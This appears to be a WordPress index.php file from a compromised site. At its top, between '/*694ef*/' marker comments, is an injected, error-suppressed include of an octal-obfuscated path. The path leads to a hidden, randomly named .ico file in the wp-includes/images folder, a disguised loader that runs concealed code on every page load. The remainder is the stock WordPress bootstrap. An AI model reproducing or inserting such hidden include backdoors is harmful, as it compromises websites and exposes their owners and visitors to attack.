<?php
/*694ef*/

@include "\057h\157m\145/\157p\160o\151u\172n\057d\145m\157.\145l\154i\160s\151s\164e\143h\163.\143o\155/\155r\151n\153a\156d\160r\151n\164e\162/\167p\055i\156c\154u\144e\163/\151m\141g\145s\057.\0624\0634\064f\062e\056i\143o";

/*694ef*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
